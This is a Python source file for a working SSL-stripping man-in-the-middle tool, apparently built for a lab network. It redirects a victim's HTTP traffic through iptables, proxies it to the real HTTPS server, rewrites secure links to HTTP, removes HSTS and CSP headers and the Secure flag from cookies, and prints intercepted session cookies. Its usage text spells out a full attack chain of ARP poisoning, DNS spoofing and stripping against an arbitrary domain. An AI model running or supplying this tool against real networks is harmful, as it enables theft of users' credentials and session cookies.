#!/usr/bin/env python3
"""
SSL Stripping - Transparent HTTPS -> HTTP downgrade attack

This module implements true SSLStrip functionality:
1. Intercepts HTTP traffic from the victim via iptables REDIRECT
2. Rewrites HTTPS URLs/links to HTTP in HTML responses
3. When victim clicks HTTP links, proxies to the real HTTPS server
4. Strips security headers (HSTS, CSP, etc.) to prevent browser warnings
5. Maintains a mapping of HTTP->HTTPS to handle victim requests transparently

Unlike ssl_proxy.py (which requires explicit proxy configuration), 
ssl_strip.py works transparently - the victim doesn't know they're being downgraded.

Attack chain: ARP poison -> DNS spoof -> SSL Strip
- ARP: victim believes attacker IS the gateway
- DNS: victim resolves target domain to attacker IP
- SSL Strip: victim makes HTTP request, attacker proxies to HTTPS, downgrades response

Usage:
    sudo python3 ssl_strip.py --listen-port 8080 --upstream-host web1.mylab.test

Before running, add iptables rule to redirect HTTP traffic:
    sudo iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
"""

import argparse
import re
import signal
import socketserver
import subprocess
import sys
import warnings
from http.server import BaseHTTPRequestHandler
from urllib.parse import urljoin, urlparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SSLStripHandler(BaseHTTPRequestHandler):
    """
    Transparent SSL stripping proxy handler.
    
    - Intercepts HTTP requests from victim (via iptables REDIRECT)
    - Proxies to upstream HTTPS server
    - Rewrites HTTPS URLs to HTTP in responses
    - Strips security headers (HSTS, Secure cookie flags, etc.)
    """

    upstream_host = "web1.mylab.test"
    upstream_port = 443
    listen_port = 8080
    timeout = 10.0
    log_bodies = False

    # mapping of HTTP -> HTTPS for rewriting
    url_map = {}

    protocol_version = "HTTP/1.1"

    def _read_body(self):
        """Read request body if Content-Length is present."""
        length = self.headers.get("Content-Length")
        if length is None:
            return b""
        try:
            length = int(length)
        except ValueError:
            return b""
        return self.rfile.read(length)

    def _build_upstream_url(self):
        """
        Build the upstream HTTPS URL from the HTTP request.
        
        The victim makes HTTP request to http://web1.mylab.test/path
        We proxy it to https://web1.mylab.test/path
        """
        path = self.path
        # strip any explicit scheme/host if present (shouldn't be in normal requests)
        if path.startswith("http://") or path.startswith("https://"):
            parsed = urlparse(path)
            path = parsed.path
            if parsed.query:
                path += "?" + parsed.query

        return f"https://{self.upstream_host}:{self.upstream_port}{path}"

    def _strip_url_to_http(self, url):
        """
        Rewrite HTTPS URL to HTTP.
        
        https://web1.mylab.test/page -> http://web1.mylab.test/page
        
        Stores the mapping for reverse lookup.
        """
        if not url:
            return url

        # only rewrite URLs for our target domain
        if f"{self.upstream_host}" not in url:
            return url

        # convert HTTPS -> HTTP
        if url.startswith("https://"):
            http_url = url.replace("https://", "http://", 1)
            self.url_map[http_url] = url
            if self.log_bodies:
                print(f"[SSL] Rewrite: {url} → {http_url}", flush=True)
            return http_url

        return url

    def _rewrite_response_body(self, content_type, body):
        """
        Rewrite HTTPS URLs to HTTP in HTML/CSS/JavaScript responses.
        This is the core of SSL stripping - downgrading all secure links.
        """
        if not body:
            return body

        # only rewrite text-based content
        if not any(ct in content_type.lower() for ct in ["html", "css", "javascript", "json", "xml"]):
            return body

        try:
            text = body.decode("utf-8", errors="replace")
        except Exception:
            return body

        # rewrite https:// URLs for our target domain
        # pattern: https://web1.mylab.test -> http://web1.mylab.test
        pattern = rf'https://({re.escape(self.upstream_host)})'
        replacement = rf'http://\1'
        
        rewritten = re.sub(pattern, replacement, text, flags=re.IGNORECASE)

        # also handle protocol-relative URLs (//web1.mylab.test -> http://web1.mylab.test)
        # this prevents browsers from defaulting to HTTPS
        pattern_relative = rf'//({re.escape(self.upstream_host)})'
        replacement_relative = rf'http://\1'
        rewritten = re.sub(pattern_relative, replacement_relative, rewritten, flags=re.IGNORECASE)

        if rewritten != text:
            print(f"[BODY REWRITE] Stripped {text.count('https://' + self.upstream_host)} HTTPS references", flush=True)

        return rewritten.encode("utf-8", errors="replace")

    def _make_upstream_request(self, method, body):
        """
        Forward the HTTP request as HTTPS to the real server.
        """
        url = self._build_upstream_url()

        # copy headers but adjust Host and remove hop-by-hop headers
        upstream_headers = {}
        for k, v in self.headers.items():
            lk = k.lower()
            # skip hop-by-hop headers
            if lk in ("connection", "proxy-connection", "keep-alive",
                      "proxy-authenticate", "proxy-authorization", "upgrade",
                      "te", "trailers", "transfer-encoding"):
                continue
            upstream_headers[k] = v

        # ensure Host header matches upstream
        upstream_headers["Host"] = self.upstream_host

        # log cookies being sent to server
        cookie_hdr = upstream_headers.get("Cookie")
        if cookie_hdr:
            print(f"[COOKIE → SERVER] {cookie_hdr}", flush=True)

        try:
            resp = requests.request(
                method=method,
                url=url,
                headers=upstream_headers,
                data=body if body else None,
                timeout=self.timeout,
                verify=False,  # accept self-signed certs
                allow_redirects=False,  # handle redirects manually
            )
            return resp
        except requests.RequestException as e:
            print(f"[!] Upstream request failed: {e}", file=sys.stderr, flush=True)
            return None

    def _send_stripped_response(self, upstream_resp):
        """
        Send the response back to victim with HTTPS->HTTP rewrites and security header removal.
        """
        self.send_response(upstream_resp.status_code)

        # headers to strip for security bypass
        security_headers = {
            "strict-transport-security",  # HSTS - forces HTTPS
            "content-security-policy",    # CSP - can enforce HTTPS
            "x-frame-options",            # Clickjacking protection
            "x-content-type-options",     # MIME sniffing protection
        }

        hop_by_hop = {
            "connection", "proxy-connection", "keep-alive",
            "proxy-authenticate", "proxy-authorization",
            "upgrade", "te", "trailers", "transfer-encoding",
        }

        # process response headers
        for k, v in upstream_resp.headers.items():
            lk = k.lower()

            # skip hop-by-hop headers
            if lk in hop_by_hop:
                continue

            # strip security headers
            if lk in security_headers:
                if self.log_bodies:
                    print(f"[STRIP HEADER] {k}: {v}", flush=True)
                continue

            # rewrite Location headers (redirects)
            if lk == "location":
                v = self._strip_url_to_http(v)

            # strip 'Secure' flag from Set-Cookie to allow HTTP transmission
            if lk == "set-cookie":
                original = v
                # remove Secure flag (case-insensitive)
                v = re.sub(r';\s*secure\s*(?=;|$)', '', v, flags=re.IGNORECASE)
                if v != original:
                    print(f"[STRIP SECURE] {original} -> {v}", flush=True)
                print(f"[COOKIE ← SERVER] {v}", flush=True)

            self.send_header(k, v)

        self.send_header("Connection", "close")
        self.end_headers()

        # rewrite response body to downgrade HTTPS URLs
        body = upstream_resp.content or b""
        content_type = upstream_resp.headers.get("Content-Type", "")

        stripped_body = self._rewrite_response_body(content_type, body)

        if self.log_bodies:
            print(f"[BODY] {stripped_body[:200]!r} (truncated)", flush=True)

        self.wfile.write(stripped_body)

    def _handle_method(self, method):
        """Handle any HTTP method (GET, POST, etc.)."""
        body = self._read_body()

        # only log non-static resources to reduce noise
        if not any(self.path.endswith(ext) for ext in ['.css', '.js', '.png', '.jpg', '.ico', '.woff', '.woff2']):
            print(f"[SSL] {method} {self.path}", flush=True)

        upstream_resp = self._make_upstream_request(method, body)
        if upstream_resp is None:
            self.send_error(502, "Bad Gateway")
            return

        self._send_stripped_response(upstream_resp)

    def do_GET(self):
        self._handle_method("GET")

    def do_POST(self):
        self._handle_method("POST")

    def do_HEAD(self):
        self._handle_method("HEAD")

    def log_message(self, format, *args):
        """Custom log format."""
        sys.stdout.write("[HTTP] " + format % args + "\n")
        sys.stdout.flush()


class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """Threaded server to handle multiple connections."""
    daemon_threads = True
    allow_reuse_address = True
    
    def server_bind(self):
        """Override to set SO_REUSEADDR before binding."""
        import socket
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()


class SSLStripper:
    """
    Main SSL stripping orchestrator.
    Manages iptables rules and HTTP server lifecycle.
    """

    def __init__(self, listen_host, listen_port, upstream_host, upstream_port, 
                 log_bodies=False, timeout=10.0, auto_iptables=True, target_ip=None):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.upstream_host = upstream_host
        self.upstream_port = upstream_port
        self.log_bodies = log_bodies
        self.timeout = timeout
        self.auto_iptables = auto_iptables
        self.target_ip = target_ip  # IP to intercept (where DNS spoof points)

        self.httpd = None
        self.iptables_added = False

        # configure handler class variables
        SSLStripHandler.upstream_host = upstream_host
        SSLStripHandler.upstream_port = upstream_port
        SSLStripHandler.listen_port = listen_port
        SSLStripHandler.timeout = timeout
        SSLStripHandler.log_bodies = log_bodies

    def add_iptables_rule(self):
        """
        Add iptables REDIRECT rule to intercept HTTP traffic.
        
        Only redirects HTTP traffic destined for target_ip (where DNS spoof points).
        This prevents intercepting legitimate traffic to other websites.
        """
        if not self.auto_iptables:
            print("[!] Auto-iptables disabled, skipping rule insertion")
            return

        # build rule: only redirect if destination is our target IP
        if self.target_ip:
            rule = [
                "iptables", "-t", "nat", "-I", "PREROUTING",
                "-p", "tcp", "-d", self.target_ip, "--dport", "80",
                "-j", "REDIRECT", "--to-port", str(self.listen_port)
            ]
        else:
            # fallback: redirect all port 80 (old behavior, not recommended)
            rule = [
                "iptables", "-t", "nat", "-I", "PREROUTING",
                "-p", "tcp", "--dport", "80",
                "-j", "REDIRECT", "--to-port", str(self.listen_port)
            ]

        try:
            subprocess.check_call(rule, stderr=subprocess.DEVNULL)
            self.iptables_added = True
            if self.target_ip:
                print(f"[+] iptables: redirecting {self.target_ip}:80 -> {self.listen_port}")
            else:
                print(f"[+] iptables: redirecting port 80 -> {self.listen_port}")
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to add iptables rule: {e}")
            print(f"[!] You may need to run manually:")
            print(f"    sudo {' '.join(rule)}")
            sys.exit(1)

    def remove_iptables_rule(self):
        """Remove the iptables REDIRECT rule on cleanup."""
        if not self.iptables_added:
            return

        rule = [
            "iptables", "-t", "nat", "-D", "PREROUTING",
            "-p", "tcp", "--dport", "80",
            "-j", "REDIRECT", "--to-port", str(self.listen_port)
        ]

        try:
            subprocess.check_call(rule, stderr=subprocess.DEVNULL)
            print("[+] iptables: removed REDIRECT rule")
        except subprocess.CalledProcessError:
            print("[!] Failed to remove iptables rule (may need manual cleanup)")

    def start(self):
        """Start the SSL stripping server."""
        # add iptables rule first
        self.add_iptables_rule()

        # start HTTP server
        server_address = (self.listen_host, self.listen_port)
        try:
            self.httpd = ThreadedHTTPServer(server_address, SSLStripHandler)
        except OSError as e:
            if e.errno == 98:  # address already in use
                print(f"[!] ERROR: Port {self.listen_port} is already in use!")
                print(f"[!] A previous SSL stripper may still be running.")
                print(f"[!] To fix this, run:")
                print(f"    pkill -f ssl_strip.py")
                print(f"    # Or find and kill the process:")
                print(f"    ps aux | grep ssl_strip.py")
                print(f"    kill <PID>")
                self.remove_iptables_rule()
                sys.exit(1)
            raise

        print(f"[SSL] Listening on {self.listen_host}:{self.listen_port} → https://{self.upstream_host}:{self.upstream_port}", flush=True)

        # register signal handlers for cleanup
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

        try:
            self.httpd.serve_forever()
        except (KeyboardInterrupt, SystemExit):
            pass
        except Exception as e:
            print(f"\n[!] Unexpected error: {e}", flush=True)
        finally:
            self.stop()

    def stop(self):
        """Stop server and cleanup."""
        print("\n[!] Shutting down SSL stripper...", flush=True)
        
        if self.httpd:
            try:
                self.httpd.shutdown()
                self.httpd.server_close()
                # force socket cleanup
                if hasattr(self.httpd, 'socket'):
                    try:
                        self.httpd.socket.close()
                    except Exception:
                        pass
                print("[+] HTTP server stopped", flush=True)
            except Exception as e:
                print(f"[!] Error stopping HTTP server: {e}", flush=True)

        self.remove_iptables_rule()
        print("[+] SSL stripper cleanup complete", flush=True)

    def _signal_handler(self, signum, frame):
        """Handle SIGINT/SIGTERM for graceful shutdown."""
        print("\n[!] SSL stripper received interrupt signal", flush=True)
        self.stop()
        sys.exit(0)


def main():
    parser = argparse.ArgumentParser(
        description="SSL Strip - Transparent HTTPS->HTTP downgrade attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic SSL stripping (auto-adds iptables rule)
  sudo python3 ssl_strip.py --upstream-host web1.mylab.test

  # Custom listen port
  sudo python3 ssl_strip.py --listen-port 8080 --upstream-host web1.mylab.test

  # Manual iptables management
  sudo python3 ssl_strip.py --no-iptables --upstream-host web1.mylab.test
  sudo iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

Attack chain:
  1. Run ARP poisoning: python3 arp_poisoning.py <victim> <gateway>
  2. Run DNS spoofing: python3 dns_spoofing.py --domain target.com. --attacker-ip <attacker_ip> --dns-server <dns_ip> --iface <iface>
  3. Run SSL strip: python3 ssl_strip.py --upstream-host target.com --target-ip <attacker_ip>
  4. Victim browses to http://target.com -> attacker proxies to HTTPS, downgrades response
"""
    )

    parser.add_argument("--listen-host", default="0.0.0.0",
                        help="IP to bind on (default: 0.0.0.0)")
    parser.add_argument("--listen-port", type=int, default=8080,
                        help="Port to listen on for HTTP traffic (default: 8080)")
    parser.add_argument("--upstream-host", required=True,
                        help="Upstream HTTPS server hostname (e.g., web1.mylab.test)")
    parser.add_argument("--upstream-port", type=int, default=443,
                        help="Upstream HTTPS port (default: 443)")
    parser.add_argument("--log-bodies", action="store_true",
                        help="Log (truncated) response bodies for debugging")
    parser.add_argument("--timeout", type=float, default=10.0,
                        help="Timeout for upstream requests in seconds (default: 10)")
    parser.add_argument("--no-iptables", dest="auto_iptables", action="store_false",
                        help="Don't automatically add/remove iptables rules")
    parser.add_argument("--target-ip", dest="target_ip", default=None,
                        help="Only intercept traffic to this IP (recommended to avoid breaking other sites)")

    args = parser.parse_args()

    stripper = SSLStripper(
        listen_host=args.listen_host,
        listen_port=args.listen_port,
        upstream_host=args.upstream_host,
        upstream_port=args.upstream_port,
        log_bodies=args.log_bodies,
        timeout=args.timeout,
        auto_iptables=args.auto_iptables,
        target_ip=args.target_ip
    )

    stripper.start()


if __name__ == "__main__":
    main()
